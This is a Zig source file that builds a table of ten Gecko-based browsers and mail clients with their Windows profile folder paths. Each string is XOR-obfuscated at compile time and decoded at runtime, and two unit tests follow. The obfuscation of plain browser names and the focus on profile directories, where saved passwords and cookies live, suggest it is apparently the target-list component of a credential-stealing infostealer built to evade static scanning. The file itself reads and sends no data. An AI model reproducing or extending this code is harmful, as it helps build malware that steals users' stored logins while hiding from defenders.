const std = @import("std");
const hash = @import("../types/hash.zig");

pub const BrowserInfo = struct {
    name: []const u8,
    path_suffix: []const u8,
};

const E = struct {
    pub const names = [10][]const u8{
        &hash.xorEncrypt("Firefox"),
        &hash.xorEncrypt("Thunderbird"),
        &hash.xorEncrypt("SeaMonkey"),
        &hash.xorEncrypt("Waterfox"),
        &hash.xorEncrypt("Pale Moon"),
        &hash.xorEncrypt("K-Meleon"),
        &hash.xorEncrypt("IceDragon"),
        &hash.xorEncrypt("Cyberfox"),
        &hash.xorEncrypt("BlackHaw"),
        &hash.xorEncrypt("Mercury"),
    };
    pub const paths = [10][]const u8{
        &hash.xorEncrypt("Mozilla\\Firefox\\Profiles"),
        &hash.xorEncrypt("Thunderbird\\Profiles"),
        &hash.xorEncrypt("Mozilla\\SeaMonkey\\Profiles"),
        &hash.xorEncrypt("Waterfox\\Profiles"),
        &hash.xorEncrypt("Moonchild Productions\\Pale Moon\\Profiles"),
        &hash.xorEncrypt("K-Meleon\\Profiles"),
        &hash.xorEncrypt("Comodo\\IceDragon\\Profiles"),
        &hash.xorEncrypt("8pecxstudios\\Cyberfox\\Profiles"),
        &hash.xorEncrypt("NETGATE Technologies\\BlackHaw\\Profiles"),
        &hash.xorEncrypt("mercury\\Profiles"),
    };
};

const NAME_BUF_SIZE = 256;
const PATH_BUF_SIZE = 512;

var _init = false;
var _name_buf: [NAME_BUF_SIZE]u8 = undefined;
var _path_buf: [PATH_BUF_SIZE]u8 = undefined;
var _browsers: [10]BrowserInfo = undefined;

fn initData() void {
    if (_init) return;
    var np: usize = 0;
    var pp: usize = 0;
    inline for (0..10) |i| {
        const ne = E.names[i];
        const pe = E.paths[i];
        hash.xorDecrypt(ne, _name_buf[np..][0..ne.len]);
        hash.xorDecrypt(pe, _path_buf[pp..][0..pe.len]);
        _browsers[i] = .{
            .name = _name_buf[np..][0..ne.len],
            .path_suffix = _path_buf[pp..][0..pe.len],
        };
        np += ne.len;
        pp += pe.len;
    }
    _init = true;
}

pub fn getGeckoBrowsers() []const BrowserInfo {
    initData();
    return &_browsers;
}

test "gecko browser count" {
    const browsers = getGeckoBrowsers();
    try std.testing.expect(browsers.len == 10);
}

test "first browser is Firefox" {
    const browsers = getGeckoBrowsers();
    try std.testing.expectEqualSlices(u8, "Firefox", browsers[0].name);
}
